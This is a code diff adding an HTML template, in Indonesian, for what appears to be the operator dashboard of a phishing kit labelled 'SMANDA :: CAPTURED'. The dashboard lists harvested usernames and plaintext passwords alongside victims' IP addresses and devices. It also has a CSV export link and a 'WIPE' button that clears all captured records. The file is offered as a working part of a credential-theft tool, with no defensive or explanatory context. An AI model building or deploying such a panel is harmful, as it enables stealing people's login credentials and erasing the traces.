@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="id"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SMANDA :: LOG</title>
+<style>
+body{margin:0;background:#0e1116;color:#d7dee8;font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+header{padding:16px 18px;border-bottom:1px solid #1d2530;display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+h1{font-size:15px;margin:0;letter-spacing:1px;color:#5ee0c0;font-weight:700}
+.meta{font-size:12px;color:#7d8798}
+a.btn{margin-left:auto;font-size:12px;text-decoration:none;color:#0e1116;background:#5ee0c0;
+ padding:6px 10px;border-radius:6px;font-weight:700}
+a.red{background:#ff6b6b;margin-left:6px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th,td{text-align:left;padding:9px 10px;border-bottom:1px solid #1a212b;vertical-align:top;word-break:break-all}
+th{position:sticky;top:0;background:#131922;color:#7d8798;font-size:11px;letter-spacing:1px;text-transform:uppercase}
+tr:hover td{background:#131922}
+.k{color:#ffd479;font-weight:700}
+.empty{padding:40px 18px;text-align:center;color:#5b6675}
+</style></head><body>
+<header><h1>SMANDA :: CAPTURED</h1><span class="meta">%META%</span>
+<a class="btn" href="/admin.csv">CSV</a>
+<a class="btn red" href="/admin/clear" onclick="return confirm('Hapus semua?')">WIPE</a>
+</header><table><thead><tr><th>#</th><th>Waktu</th><th>Username</th><th>Password</th><th>IP</th><th>Device</th></tr></thead><tbody>%ROWS%</tbody></table></body></html>
